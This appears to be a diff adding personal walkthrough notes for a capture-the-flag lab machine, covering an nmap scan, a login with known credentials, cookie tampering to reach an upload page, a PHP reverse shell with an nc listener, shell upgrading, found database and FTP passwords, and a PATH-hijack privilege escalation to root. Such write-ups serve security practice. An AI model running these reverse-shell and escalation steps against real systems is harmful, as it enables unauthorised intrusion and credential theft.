@@ -1,0 +1,70 @@
+---NMAP---
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
+|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
+|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Welcome
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---SEARCHING THE SITE---
+nothing but there could be a login was found
+
+---USING BURPSUITE TO PASSIVE SCAN---
+found /cdn-cgi/login
+using the previously found user/pass: administrator/MEGACORP_4dm1n!!
+done
+/admin.php?content=uploads have a super admin privileges
+found a custom cookie=> user=XXXXX; role=NAME
+searching the accounts content by iterating on the phpsearch ID
+/cdn-cgi/login/admin.php?content=accounts&id=1
+found a super admin USER and ROLE
+using burp to send a specific cookie to the /admin.php?content=uploads page
+downloading and uploading a php reverse shell
+
+---USING THE REVERSE SHELL---
+*git clone https://github.com/maurosoria/dirsearch.git
+*cd dirsearch
+*python3 dirsearch.py -u http://10.10.10.28 -e php
+found a /uploads dir
+
+then setting a HOST listener
+*nc -lvp 5555
+executing the shell
+*curl http://10.10.10.28/uploads/test.php
+
+---SETTING UP A PROPER SHELL---
+*SHELL=/bin/bash script -q /dev/null
+*Ctrl-Z
+*stty raw -echo
+*fg
+*reset
+*xterm
+
+---SEARCHING FOR MORE INFO INTO THE /cdn-cgi/login/---
+found db.php file with hardcoded mysql connection
+<?php
+  $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+
+---PRIVILEGE ESCALATION---
+*id
+show that robert is member of bugtracker group
+*find / -type f -group butracker 2>/dev/null
+found a executable file
+/usr/bin/bugtracker
+executing the file
+*string /usr/bin/bugtracker
+found cat /root/reports/
+changing the $PATH and setting up new cat command that executes the /bin/sh
+*export PATH=/tmp:$PATH
+*cd /tmp/
+*echo '/bin/sh' > cat
+*chmod +x cat
+executing the /usr/bin/bugtracker againg and done
+
+found a root.txt flag and a filezilla config folder
+found a ftp user/pass: ftpuser/mc@F1l3ZilL4
